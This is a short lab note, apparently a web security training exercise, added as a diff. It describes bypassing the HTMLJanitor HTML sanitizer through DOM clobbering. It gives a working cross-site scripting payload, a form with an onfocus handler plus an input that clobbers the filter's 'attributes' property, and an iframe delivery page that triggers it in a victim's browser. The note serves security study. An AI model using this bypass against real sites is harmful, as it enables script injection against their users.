@@ -1,0 +1,21 @@
+goal:
+    HTMLJanitor library
+    construct a vector that bypasses the filter and uses DOM clobbering to inject a vector that calls the print() function
+
+    deliver to victim
+
+
+analysis:
+    first have to go through HTMLJanitor
+        set attributes => we can bypass this attributes => use input which has and undefined length
+
+payload:
+    <form id="x" tabindex=0 onfocus="print()"><input id="attributes">
+    
+    submit this to comment => wait victim to submit this form
+    => we can try autosubmit with tabindex id => #x
+
+    submit this to exploit web => deliver to victim
+
+    <iframe src="outlab/post?postid=" onload="setTimeout(()=>this.src=this.src+'#x',500)">
+        try to set time out to make sure that the comment containing the injection is loaded before the js is executed
